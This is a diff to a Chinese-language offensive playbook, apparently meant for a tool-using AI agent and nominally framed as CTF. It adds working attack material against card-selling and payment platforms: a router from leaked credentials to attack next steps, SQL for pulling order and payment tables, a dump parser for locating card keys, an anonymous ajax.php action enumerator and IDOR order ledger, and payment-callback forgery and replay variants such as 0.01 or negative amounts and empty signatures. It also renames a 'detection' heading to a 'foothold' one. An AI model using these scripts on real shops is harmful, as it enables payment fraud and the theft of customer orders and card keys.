@@ -32570,6 +32570,62 @@ if __name__ == "__main__":
 | `*.rds.amazonaws.com`, `*.aliyuncs.com` | 云数据库 | 判断公网可达、白名单、账号权限 |
 | `unix_socket` | 本机 socket | LFI/RCE 后直连 socket |
 
+## 9. 支付配置与数据库凭证 Pivot
+
+配置泄露命中后，优先把字段路由到“可产生业务结果”的链路。数据库凭证能抽订单账本，支付密钥能伪造或重放回调，对象存储能拿发货文件，Redis 能拿 session/队列。
+
+| 字段 | 常见值 | 目标 | 下一跳 |
+|---|---|---|---|
+| `DB_*`, `DATABASE_URL` | MySQL/PostgreSQL/MSSQL | 订单、支付流水、卡密表 | SQLi / 直连抽表 |
+| `REDIS_URL`, `CACHE_DRIVER` | Redis/cluster | session、购物车、队列 job | NoSQL / 队列发货 |
+| `QUEUE_CONNECTION` | redis/database/sqs | 异步回调、发货任务 | payment-callback |
+| `PAY_KEY`, `EPAY_KEY` | MD5/HMAC key | Epay/码支付回调 | signature implementation |
+| `STRIPE_SECRET`, `PAYPAL_CLIENT_SECRET` | 第三方 API secret | 账单/订阅/退款状态 | payment-subscription |
+| `OSS_*`, `S3_*` | bucket/key | 下载链接、卡密文件、备份 | backup-log-leak |
+
+### 9.1 配置到攻击链路由器
+
+```python
+# config_pivot_router.py — 泄露配置到下一跳路线
+ROUTES = {
+    "db": ("DB_", "DATABASE_URL", "MYSQL_", "POSTGRES_", "SQLSERVER_"),
+    "redis": ("REDIS_", "CACHE_", "SESSION_DRIVER", "QUEUE_CONNECTION"),
+    "payment": ("PAY_", "EPAY_", "STRIPE_", "PAYPAL_", "ALIPAY_", "WECHATPAY_"),
+    "storage": ("OSS_", "S3_", "COS_", "BUCKET"),
+}
+
+NEXT = {
+    "db": "抽 orders/pay_log/cards/config 表，生成订单状态机",
+    "redis": "枚举 session/cart/order/queue key，接发货与登录态",
+    "payment": "枚举 sign_type/canonical/回调字段，转签名实现缺陷",
+    "storage": "列 bucket/object 前缀，找备份、卡密、下载链接",
+}
+
+def route_config(env):
+    out = []
+    for name, prefixes in ROUTES.items():
+        keys = [k for k in env if any(k.startswith(p) or k == p for p in prefixes)]
+        if keys:
+            out.append({"route": name, "keys": keys, "next": NEXT[name]})
+    return out
+```
+
+### 9.2 连接后最小抽样
+
+直连数据库后先做最小抽样，不要一上来全库导出：
+
+```sql
+SELECT DATABASE(), USER(), VERSION();
+SHOW TABLES LIKE '%order%';
+SHOW TABLES LIKE '%pay%';
+SHOW TABLES LIKE '%card%';
+SHOW TABLES LIKE '%config%';
+SELECT id,out_trade_no,status,amount,paid_at FROM orders ORDER BY id DESC LIMIT 5;
+SELECT order_id,trade_no,money,status,raw FROM pay_log ORDER BY id DESC LIMIT 5;
+```
+
+Evidence 保存 `config_pivot.json`、`db_min_sample.jsonl`、`payment_secret_probe.json`。成功样本是配置字段带来可复查的订单、回调、session、队列或发货差分；失败样本是凭证只在容器内可解析、账号权限不足且无业务表、支付 key 与当前网关不匹配。
+
 ## 攻击链 / 工作流
 
 ```
@@ -32579,7 +32635,8 @@ if __name__ == "__main__":
 4. 判断凭证作用域：本地数据库、内网数据库、云 RDS、缓存服务、消息队列
 5. 连接后先抓版本、当前库、当前用户、表名前缀和权限位
 6. 关联后续链路：SQLi 文件读写、NoSQL 未授权、备份下载、管理后台登录、支付回调签名
-7. 记录泄露路径、字段片段、连接结果、下一跳入口和失败分支
+7. 将 DB/Redis/Queue/Payment/Storage 配置路由到订单、队列、卡密、回调和对象存储
+8. 记录泄露路径、字段片段、连接结果、下一跳入口和失败分支
 ```
 
 ## Evidence
@@ -32592,6 +32649,7 @@ if __name__ == "__main__":
 | 环境信息 | phpinfo/debug 页面中的 DOCUMENT_ROOT、open_basedir、框架版本 |
 | 下一跳 | 可读表、可达内网服务、支付密钥、管理后台或备份路径 |
 | 失败样本 | 403/404、连接超时、账号无权限、host 只在容器内解析 |
+| 业务差分 | 订单、回调、队列、session、卡密或对象存储的可复查变化 |
 
 ## MCP 工具映射
 
@@ -32602,7 +32660,7 @@ if __name__ == "__main__":
 | 工具执行 | `run_ctf_tool` | 调用目录扫描、git-dumper、curl 等工具 |
 | 证据记录 | `workspace_write_text` | 保存配置字段样例和验证结果 |
 
-## 8. 关联技术
+## 10. 关联技术
 
 - [[01-sqli-fundamentals]] — 获凭证后连接数据库
 - [[03-nosql-injection]] — NoSQL 未授权
@@ -32970,6 +33028,51 @@ def payment_dump_map(path):
 | `coupon.used`, `balance_log`, `wallet_log` | 重复使用与账本差异 |
 | `users.vip_until`, `subscription_until`, `credits` | 权益到账与残留 |
 
+## 7. 命中后的订单/卡密抽取路线
+
+备份和日志命中后，优先产出“可操作索引”，而不是整库笔记。对支付/发卡题，最有价值的是表关系、最近订单、未使用卡密、回调 raw body、签名字段、安装默认账号。
+
+| 命中物 | 第一轮提取 | 第二轮动作 |
+|---|---|---|
+| SQL dump | `CREATE TABLE`、`INSERT INTO` 的表/字段 | 订单账本、卡密表、配置表 |
+| 应用日志 | SQL 模板、回调 raw body、错误栈 | 反推 SQLi 闭合与回调字段 |
+| Git dump | `.env`、路由、控制器、migrations | 配置 Pivot + 业务 API |
+| install.sql | 默认 admin、表前缀、初始配置 | 后台登录/订单表定位 |
+| 压缩网站备份 | `config.php`、`ajax.php`、`notify.php` | 平台指纹和签名实现 |
+
+### 7.1 Dump 到订单图谱
+
+```python
+# dump_payment_graph.py — 从 SQL dump 生成订单/卡密/回调图谱
+import json
+import re
+from pathlib import Path
+
+CREATE_RX = re.compile(r"CREATE TABLE [`\"]?([^`\"\s(]+)(.*?);", re.I | re.S)
+COL_RX = re.compile(r"[`\"]?([a-zA-Z0-9_]+)[`\"]?\s+(?:int|varchar|char|text|decimal|datetime|timestamp)", re.I)
+HINTS = re.compile(r"order|trade|pay|notify|card|kami|cdk|coupon|wallet|balance|config|user", re.I)
+
+def build_graph(path):
+    text = Path(path).read_text(encoding="utf-8", errors="ignore")
+    nodes = []
+    for table, body in CREATE_RX.findall(text):
+        cols = COL_RX.findall(body)
+        score = int(bool(HINTS.search(table))) + sum(1 for c in cols if HINTS.search(c))
+        if score:
+            nodes.append({"table": table, "score": score, "columns": cols[:80]})
+    print(json.dumps(sorted(nodes, key=lambda x: (-x["score"], x["table"])), ensure_ascii=False, indent=2))
+```
+
+### 7.2 日志到回调重放材料
+
+日志里若出现 `notify_url`、`out_trade_no`、`trade_no`、`sign`、`raw xml/json`，直接整理成 `callback_replay_seed.jsonl`：
+
+```json
+{"endpoint":"/notify.php","out_trade_no":"202607040001","amount":"0.01","status":"success","sign_type":"MD5","raw_source":"runtime.log:188"}
+```
+
+成功样本：dump 中抽到未使用卡密、日志中抽到合法回调样本、源码中定位签名拼接函数、安装 SQL 中抽到后台账号或表前缀。失败样本：备份仅静态资源、日志无 SQL/回调字段、dump 只含空 schema。
+
 ## 攻击链 / 工作流
 
 ```
@@ -32979,7 +33082,8 @@ def payment_dump_map(path):
 4. 解压/解析后提取 schema、用户表、订单表、支付流水、卡密表、日志中的 SQL/Token/错误栈
 5. 关联配置泄露与源码恢复：定位数据库连接、后台路径、框架版本
 6. 对 Git 泄露执行最小恢复，确认源码/配置/历史提交是否含敏感信息
-7. 输出影响面：泄露表、时间范围、字段类型、订单/权益账本和下一跳入口
+7. 将 dump/log/source/install 命中物转成订单图谱、卡密候选、回调样本和配置 Pivot
+8. 输出影响面：泄露表、时间范围、字段类型、订单/权益账本和下一跳入口
 ```
 
 ## Evidence
@@ -32991,22 +33095,9 @@ def payment_dump_map(path):
 | 数据内容 | 表名、字段名、样例行、日志关键片段 |
 | 源码恢复 | `.git/HEAD`、恢复提交、敏感文件路径 |
 | 支付账本 | 订单表、支付流水表、卡密/权益表、状态字段和金额字段 |
+| 回
 
-## MCP 工具映射
-
-| 攻击步骤 | MCP 工具 | 说明 |
-|---------|---------|------|
-| 知识检索 | `kb_router` | 按 backup leak、log leak、git exposure 搜索 |
-| HTTP 探测 | `http_probe` | 批量验证候选备份/日志路径 |
-| 工具执行 | `run_ctf_tool` | 调用 git-dumper、目录枚举、解包/解析脚本 |
-| 证据记录 | `workspace_write_text` | 保存文件哈希、字段样例和恢复清单 |
-
-## 7. 关联技术
-
-- [[04-config-exposure]] — 配置文件泄露
-- [[01-sqli-fundamentals]] — 数据库连接后的利用
-- [[06-card-platform]] — 发卡平台实战
-- [[file-upload-xxe-lfi]] — 文件读取
+[... content truncated for size ...]
 
 
 ---
@@ -33086,7 +33177,7 @@ Host: target.com
 
 **效果**：单次请求返回全库 CDK（10万+ 条），响应可达 25MB+。无需 Cookie、Token 或任何认证。
 
-### 检测方法
+### 打点方法
 
 1. 枚举 `mod` 参数值（如 `faka`, `kami`, `cdk`, `card`, `query`）
 2. 观察响应中是否包含多段错误页 + 数据页（堆叠输出特征）
@@ -33288,9 +33379,72 @@ XSS 链路:
 | `getcount` | GET/POST + AJAX 头 | 订单数/金额/库存统计 | 估算枚举范围 |
 | 支付回调 | 空签名/错误签名/重放 | 订单状态或发货状态变化 | 支付绕过 |
 
+## 9. 自动化枚举与回调链
+
+发卡平台的执行节奏是：先拿平台指纹和 API action，再用匿名 session 打订单查询，抽 `id+skey` 后进详情，最后对照发货账本和回调接口。不要只证明单个 IDOR，要把订单、卡密、金额、支付状态连成一张表。
+
+### 9.1 API action 枚举器
+
+```python
+# card_platform_action_probe.py — 发卡平台 action 差分
+import hashlib
+import json
+import requests
+
+ACTIONS = ["gettool", "getcount", "query", "order", "pay", "settle", "login", "captcha"]
+
+def probe(base):
+    s = requests.Session()
+    rows = []
+    for act in ACTIONS:
+        for method in ("GET", "POST"):
+            url = base.rstrip("/") + f"/ajax.php?act={act}"
+            headers = {"Referer": base, "X-Requested-With": "XMLHttpRequest"}
+            r = s.request(method, url, headers=headers, data={"page": 1, "type": "qq", "qq": "1"}, timeout=8)
+            rows.append({
+                "act": act,
+                "method": method,
+                "status": r.status_code,
+                "len": len(r.content),
+                "hash": hashlib.sha1(r.content[:4096]).hexdigest(),
+                "json_like": r.text.strip().startswith(("{", "[")),
+                "markers": [m for m in ("skey", "kminfo", "result", "money", "isnext", "CDK") if m in r.text],
+            })
+    print(json.dumps(rows, ensure_ascii=False, indent=2))
+```
+
+### 9.2 订单枚举到卡密账本
+
+```python
+# card_order_ledger.py — query/order 二跳合并
+def normalize_order(row):
+    return {
+        "id": row.get("id") or row.get("orderid"),
+        "skey": row.get("skey"),
+        "product": row.get("name") or row.get("goods"),
+        "money": row.get("money") or row.get("price"),
+        "status": row.get("status"),
+        "card_marker": bool(row.get("result") or row.get("kminfo")),
+    }
+```
+
+账本字段：`order_id,skey,product,money,status,result_hash,kminfo_hash,input,query_page,detail_status`。成功样本是匿名枚举能稳定得到 `skey`，详情接口返回卡密或下载信息，且字段能与商品/金额/状态对齐。
+
+### 9.3 回调链分叉
+
+| 回调信号 | 变体 | 判定 |
+|---|---|---|
+| `notify.php` 返回签名失败 | 正确字段 + 错误 sign | 只证明接口存在 |
+| `sign_type` 可控 | MD5/HMAC/空值切换 | 转签名实现缺陷 |
+| `out_trade_no` 可枚举 | 已存在订单 + 新 `transaction_id` | 转重放/幂等 |
+| `money/total_fee` 被业务采用 | 0.01 / 原价 / 负数 | 转金额字段优先级 |
+| 回调后发货 | 订单状态、卡密、余额变化 | 链路成立 |
+
+Evidence 新增 `card_action_matrix.json`、`card_order_ledger.csv`、`card_callback_diff.json`。
+
 ## Evidence
 
-| 风险点 | 证据 |
+| 链路 | 证据 |
 |--------|------|
 | 全量库存泄露 | `?mod=faka&action=show` 请求/响应、CDK 字段字段样例、响应条数 |
 | IDOR 订单枚举 | `act=query` 页码、匿名 Session、`isnext` 翻页证据、订单 ID 范围 |
@@ -33308,7 +33462,7 @@ XSS 链路:
 | 工具执行 | `run_ctf_tool` | 调用枚举脚本、Playwright/XSS 验证或 Burp 导出复放 |
 | 证据记录 | `workspace_write_text` | 保存订单、CDK 字段、请求响应与约束对比 |
 
-## 9. 关联技术
+## 10. 关联技术
 
 - [[sqli-nosqli]] — WAF 绕过与 SQL 注入
 - [[01-idor-enumeration]] — IDOR 枚举技术
